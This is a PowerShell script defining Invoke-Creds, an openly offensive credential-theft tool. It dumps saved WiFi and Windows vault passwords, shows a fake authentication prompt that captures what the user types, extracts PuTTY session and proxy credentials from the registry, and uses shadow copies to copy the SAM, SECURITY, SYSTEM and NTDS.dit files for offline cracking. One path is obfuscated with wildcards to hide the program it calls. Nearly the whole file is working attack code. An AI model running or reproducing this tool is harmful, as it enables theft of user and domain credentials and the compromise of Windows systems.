function Invoke-Creds {
[CmdletBinding()]
param (
	[Switch]$Help,
	[Switch]$List,
	[Switch]$WifiCreds,
	[Switch]$IeCreds,
	[Switch]$AuthPrompt,
	[Switch]$PuttyKeys,
	[Switch]$CopySAM,
	[String]$Dest,
	[Switch]$CopyNtds,
	[String]$Dest2=$Dest
)

	if ($Help -eq $True) {
		Write @"

 ### Invoke-Creds Help ###
 --------------------------------
 Available Invoke-Creds Commands:
 --------------------------------
 ---------------------------------------------------------------------
  -WiFiCreds
 ---------------------------------------------------------------------

   [*] Description: Dumps saved WiFi Credentials.

   [*] Usage: Invoke-Creds -WiFiCreds                   

 ---------------------------------------------------------------------
  -IeCreds
 ---------------------------------------------------------------------

   [*] Description: Dumps saved IE Credentials.
   
   [*] Usage: Invoke-Creds -IeCreds                                    

 ---------------------------------------------------------------------
  -AuthPrompt
 --------------------------------------------------------------------- 

   [*] Description: Invokes an authentication prompt to the target 
       and captures any entered credentials.

   [*] Usage: Invoke-Creds -AuthPrompt

 ---------------------------------------------------------------------
  -PuttyKeys
 --------------------------------------------------------------------- 

   [*] Description: Dumps any saved putty sessions/keys/passwords.

   [*] Usage: Invoke-Creds -PuttyKeys
   
 ---------------------------------------------------------------------
  -CopySAM [-Dest] C:\temp\
 --------------------------------------------------------------------- 

   [*] Description: Utilizes Volume Shadow Copy to copy the SAM, SYSTEM
       and SECURITY files from C:\windows\system32\config. These can be 
	   parsed offline.

   [*] Usage: Invoke-Creds -CopySAM -Dest C:\temp\
   
 ---------------------------------------------------------------------
  -CopyNtds [-Dest] C:\temp\
 --------------------------------------------------------------------- 

   [*] Description: Utilizes Volume Shadow Copy to copy the NTDS.dit 
       and SYSTEM files. These files can be parsed offline.

   [*] Usage: Invoke-Creds -CopyNtds -Dest C:\temp\
   
"@
	}
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Creds Command List:
 --------------------------
 Invoke-Creds -WiFiCreds
 Invoke-Creds -IeCreds
 Invoke-Creds -AuthPrompt
 Invoke-Creds -PuttyKeys
 Invoke-Creds -CopySAM -Dest C:\temp
 Invoke-Creds -CopyNtds -Dest C:\temp

"@
	}
	elseif ($WifiCreds) {
	# https://jocha.se/blog/tech/display-all-saved-wifi-passwords
		(C:\??*?\*3?\ne?s?.e?e wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ "Wireless Profile"=$name;"Password"=$pass }} | Format-Table -AutoSize

	}
	elseif ($IeCreds) {
	# https://www.toddklindt.com/blog/_layouts/mobile/dispform.aspx?List=56f96349-3bb6-4087-94f4-7f95ff4ca81f&ID=606
		[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
		$vault = New-Object Windows.Security.Credentials.PasswordVault
		$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-List
	}
	elseif ($AuthPrompt) {
		$c = Get-Credential -Message "Credentials Required For $env:userdomain\$env:username"
		$u = $c.GetNetworkCredential().username
		$p = $c.GetNetworkCredential().password

		Write "Username: $u"
		Write "Password: $p"
	}
	elseif ($PuttyKeys) {
		$SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name | ForEach-Object { $_.split("\")[5]}
			
		foreach ($Session in $SavedSessions) {
			$HostName = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).Hostname
			$PrivateKey = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).PublicKeyFile
			$Username = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).UserName
			$ProxyHost = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyHost
			$ProxyPassword = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPassword
			$ProxyPort = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPort
			$ProxyUsername = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyUsername
			$Results = "`nSession Name: $Session`nHostname/IP: $HostName`nUserName: $UserName`nPrivate Key: $PrivateKey`nProxy Host: $ProxyHost`nProxy Port: $ProxyPort`nProxy Username: $ProxyUsername`nProxy Password: $ProxyPassword"

			Write $Results
		}
	}
	elseif ($CopySAM -and $Dest) {
		# https://docs.microsoft.com/en-us/previous-versions/windows/desktop/vsswmi/create-method-in-class-win32-shadowcopy
		
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		$SAMExists = (Test-Path "C:\windows\system32\config\SAM") 
		
		if ($CheckElevated -and $SAMExists) {

			# create shadow copy
			$class = [WMICLASS]"root\cimv2:win32_shadowcopy"
			$class.create("C:\", "ClientAccessible")
				
			# get the Device object name
			$DeviceObjectName = (Get-WmiObject win32_shadowcopy | select -ExpandProperty DeviceObject)
				
			# copy SYSTEM
			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SYSTEM $Dest)
			
			# copy SECURITY
			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SECURITY $Dest)
				
			# copy SAM
			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SAM $Dest)
				
			# delete shadow copy
			(C:\windows\system32\vssadmin.exe delete shadows /For=C: /quiet)
		}
		elseif (!$CheckElevated) {
			Write "This process requires elevation. Make sure you're admin first."
		}
		elseif (!$SAMExists) {
			Write " [!] Can't find SAM file."
		}
	}
	elseif ($CopyNtds -and $Dest) {
		
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		$NTDSExists = (Test-Path "C:\windows\NTDS\NTDS.dit") 
		
		if ($CheckElevated -and $NTDSExists) {
			# create shadow copy
			$class = [WMICLASS]"root\cimv2:win32_shadowcopy"
			$class.create("C:\", "ClientAccessible")
				
			# get the Device object name
			$DeviceObjectName = (Get-WmiObject win32_shadowcopy | select -ExpandProperty DeviceObject)
				
			# copy NTDS
			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\NTDS\NTDS.dit $Dest)
				
			# copy SYSTEM
			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SYSTEM $Dest)
				
			# delete shadow copy
			(C:\windows\system32\vssadmin.exe delete shadows /For=C: /quiet)
		}
		elseif (!$CheckElevated) {
			Write "This process requires elevation. Make sure you're admin first."
		}
		elseif (!$NTDSExists) {
			Write " [!] Can't find NTDS.dit file."
		}
	}
}
